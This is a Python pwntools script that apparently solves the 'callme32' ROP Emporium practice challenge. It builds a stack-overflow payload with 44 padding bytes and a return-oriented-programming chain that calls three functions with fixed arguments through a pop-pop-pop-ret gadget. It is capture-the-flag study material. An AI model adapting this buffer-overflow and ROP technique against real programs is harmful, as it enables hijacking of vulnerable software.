#!/usr/bin/env python

from pwn import *

p = process("./callme32")
p.recv(1024)

payload = (
    "\x90" * 44 +
    p32(0x80485c0) + # callme_one,
    p32(0x080488a9) + # pop esi ; pop edi ; pop ebp ; ret
    p32(1) + p32(2) + p32(3) +
    p32(0x8048620) + # callme_two
    p32(0x080488a9) + # pop esi ; pop edi ; pop ebp ; ret
    p32(1) + p32(2) + p32(3) +
    p32(0x80485b0) + # callme_three
    p32(0x080488a9) + # pop esi ; pop edi ; pop ebp ; ret
    p32(1) + p32(2) + p32(3) 
)

p.sendline(payload)
print(p.recvall())

p.close()
